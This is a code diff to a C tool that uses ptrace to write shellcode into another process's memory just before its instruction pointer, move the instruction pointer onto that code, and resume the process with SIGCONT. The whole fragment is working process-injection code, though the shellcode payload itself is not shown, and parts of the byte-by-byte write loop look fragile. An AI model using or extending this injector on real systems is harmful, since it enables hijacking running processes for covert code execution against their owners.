@@ -130,6 +130,11 @@ PTR_T get_ip_reg(pid_t pid)
   return (PTR_T) (ret + OFFSET);
 }
 
+PTR_T set_ip_reg(pid_t pid, PTR_T addr)
+{
+  return ptrace(PTRACE_POKEUSER, pid, sizeof(long) * IP_REG, addr);
+}
+
 const char *get_file_ext(const char *pathname) {
     const char *ptr = strrchr(pathname, '.');
     if(!ptr || ptr == pathname)
@@ -242,6 +247,8 @@ int main(int argc, char *argv[])
 
   PTR_T ip = get_ip_reg(pid);
 
+  PTR_T ptr = ip - shellcode_size;
+
   #ifdef __DEBUG__
   printf("%s Instruction pointer (RIP/EIP): %p\n", DEBUG, ip);
   #endif
@@ -250,14 +257,14 @@ int main(int argc, char *argv[])
   printf("%s Injecting shellcode...\n", INFO);
   #endif
 
-  for(int i = 0; i < strlen(shellcode) + 1; i++, ip++)
+  for(int i = 0; i < strlen(shellcode) + 1; i++, ptr++)
   {
     // too much output
-    //#ifdef __DEBUG__
-    //printf("%s %i: 0x%02x  %c\t%p\n", DEBUG, i, *(shellcode + i), *(shellcode + i), ip);
-    //#endif
+    #ifdef __DEBUG__
+    printf("%s %i: 0x%02x  %c\t%p\n", DEBUG, i, *(shellcode + i), *(shellcode + i), ptr);
+    #endif
 
-    ret = ptrace(PTRACE_POKETEXT, pid, ip, *(shellcode + i));
+    ret = ptrace(PTRACE_POKETEXT, pid, ptr, *(shellcode + i));
     if(ret != 0)
     {
       #ifdef __OUTPUT__
@@ -267,6 +274,15 @@ int main(int argc, char *argv[])
       exit(1);
     }
   }
+
+  #ifdef __DEBUG__
+  printf("%s Realigning instruction pointer...\n", DEBUG);
+  #endif
+  set_ip_reg(pid, ip-shellcode_size+1);
+
+  #ifdef __DEBUG__
+  printf("%s instruction pointer is now: %p\n", DEBUG, get_ip_reg(pid));
+  #endif
 
   #ifdef __OUTPUT__
   printf("%s Shellcode injected. Sending SIGCONT.\n", INFO);
